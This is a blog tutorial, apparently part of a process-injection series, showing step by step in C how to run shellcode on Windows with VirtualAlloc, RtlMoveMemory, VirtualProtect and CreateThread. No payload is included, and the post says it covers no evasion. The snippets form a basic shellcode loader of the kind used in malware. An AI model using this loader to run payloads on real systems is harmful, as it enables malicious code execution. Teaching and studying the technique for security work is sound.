---
layout: post
title:  "Executing payload locally using shellcode."
---

### Executing payload locally using shellcode.

## Introduction

If you're delving into the world of shellcode execution, one of the simplest and direct approaches involves initiating its runtime through the creation of a new thread. This technique leverages Windows APIs such as VirtualAlloc, VirtualProtect, and CreateThread to efficiently run your shellcode. The focus here is on simplicity, with no emphasis on evasion or obfuscation techniques. Let's explore the basic steps to get you started on executing shellcode using threads.

## Section 1: Getting Started

Getting Started with Running Shellcode Using Threads

### Utilized functions from the Windows APIs
- **VirtualAlloc:** Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process

- **RtlMoveMemory:** Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.

- **VirtualProtect:** Changes the protection on a region of committed pages in the virtual address space of the calling process.

- **CreateThread:** Creates a thread to execute within the virtual address space of the calling process.

### Flow of the Program (key steps)

- **Memory Allocation:** A critical step involves reserving and committing memory for the payload using the VirtualAlloc function. The allocated memory, referred to as exec_mem, is initially set to read and write.

```c
void *exec_mem;
BOOL rv;
HANDLE th;
DWORD oldprotect = 0;
exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);```

- Copy Payload: The payload is then copied to the newly allocated buffer using the RtlMoveMemory function. This sets the stage for the actual execution.

```c
 RtlMoveMemory(exec_mem, payload, payload_len);```

- Memory Protection: To enable execution, the protection of the allocated memory is adjusted using VirtualProtect. The memory is now set to be executable and readable, paving the way for the payload's execution.

```c
rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);```

- Thread Creation: Assuming successful memory protection, a new thread (th) is spawned using CreateThread. The thread is tasked with executing the code residing at the address pointed to by exec_mem. To maintain control flow and observe the execution, the program waits for the created thread to finish using WaitForSingleObject.

```c
if (rv != 0) {
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
WaitForSingleObject(th, -1);} ```

##Conclusion

This basic guide provides a starting point for running shellcode via the creation of a new thread. Remember, this method is straightforward and lacks advanced evasion or obfuscation techniques.

<iframe width="853" height="480" src="https://www.youtube.com/embed/RuDwyIZdduc" title="Process Injection 0 - Executing payload locally using shellcode." frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>



